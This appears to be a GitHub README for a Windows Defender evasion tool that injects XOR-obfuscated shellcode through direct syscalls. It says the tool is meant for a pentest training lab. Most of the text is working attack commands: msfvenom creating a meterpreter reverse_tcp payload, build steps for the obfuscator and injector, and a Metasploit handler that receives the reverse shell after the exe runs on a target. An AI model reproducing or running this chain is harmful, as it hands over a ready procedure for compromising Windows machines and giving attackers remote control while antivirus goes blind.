# Bypass-AV-DirectSyscalls
Scripts to bypass Windows Defender antivirus protection using the Direct Syscalls technique with an injection of shellcode previously obfuscated with an XOR function.
These have been used in a pentest training lab and are not intended for use outside this context.

<p align="center">
    This project is translated from :
    <br />
    <a href="https://github.com/Processus-Thief/Bypass-AV-DirectSyscalls"><strong>https://github.com/Processus-Thief/Bypass-AV-DirectSyscalls</strong></a>
  </p>
</div>

<br /><br />

### Usage

1. Generate a Metasploit meterpreter in the form of a shellcode with msfvenom inside your Kali Linux :
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<SERVER> LPORT=<PORT> -f csharp
```
2. Install Visual Studio Code on your PC : https://code.visualstudio.com/download

3. Install C# and PowerShell 7 extensions in VS Code. Open the terminal inside VS Code.

4. Install a .NET SDK (recommended 7.0) : https://dotnet.microsoft.com/en-us/download

5. Create a new DotNet project in Visual Studio Code, its recommended to change directory to your Desktop (create a new folder for it) :
```  
cd Desktop
mkdir XorCipher
cd XorCipher
dotnet new console
```
6. Replace the contents of Program.cs with the contents of XorCipher.cs and replace the shellcode with that generated with msfvenom.
7. Generate the solution in the form of a PE file with its embedded libraries :
```
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```
8. The exe file will be generated in the folder bin\Release\net7.0\win-x64\publish of the project, run the compiled file in a command prompt :
```
.\XorCipher.exe
```
9. Create a second DotNet project (create a new folder on your Desktop) in another instance of Visual Studio Code :
```
cd Desktop
mkdir DirectSyscalls
cd DirectSyscalls
dotnet new console
```
10. Install the dependency DInvoke :
```
dotnet add package DInvoke --version 1.0.4
```
11. Replace the contents of Program.cs with the contents of DirectSyscalls.cs and replace the shellcode with that generated with XorCipher.exe
12. Generate the solution in the form of a PE file with its embedded libraries, the exe will be generated in the folder bin\Release\net7.0\win-x64\publish of the project :
```
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```
13. Launch a listener in the metasploit console inside your Kali Linux :
```
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <SERVER>
set lport <PORT>
exploit
```
14. Launch the compiled exe on the target computer (it must be Windows). Enjoy :)
